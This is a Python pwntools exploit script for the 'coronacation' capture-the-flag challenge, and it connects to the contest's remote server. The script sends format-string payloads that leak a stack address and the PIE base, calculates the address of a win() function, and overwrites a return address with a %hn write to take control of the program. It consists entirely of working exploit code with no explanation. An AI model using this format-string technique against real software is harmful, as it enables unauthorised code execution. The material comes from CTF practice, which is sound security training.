# exploit_coronacation

from pwn import *

# r = process("./coronacation")
r = remote("ctf.umbccd.io", 4300)

r.recvuntil("It's just the Fake News media freaking out.\n")

payload = "1"
payload += " %14$p %15$p"
r.sendline(payload)

r.recvuntil("You chose: 1 0x")
stack = int(r.recvuntil(" ")[:-1], 16) - 8 # address where play_game()'s return address is on
pie = int(r.recvline()[:-1], 16) - 0x1484 # PIE base
win = pie + 0x1165 # address of win()

log.info("stack: " + hex(stack))
log.info("PIE base: " + hex(pie))

r.recvuntil("Show the people we don't need Bernie's healthcare plan.\n")

win_low = win & 0xffff

payload = "1"
payload += "%" + str(win_low - 1) + "c%8$hn"
payload = payload.ljust(0x10, "A")
payload += p64(stack)

r.sendline(payload)

r.interactive()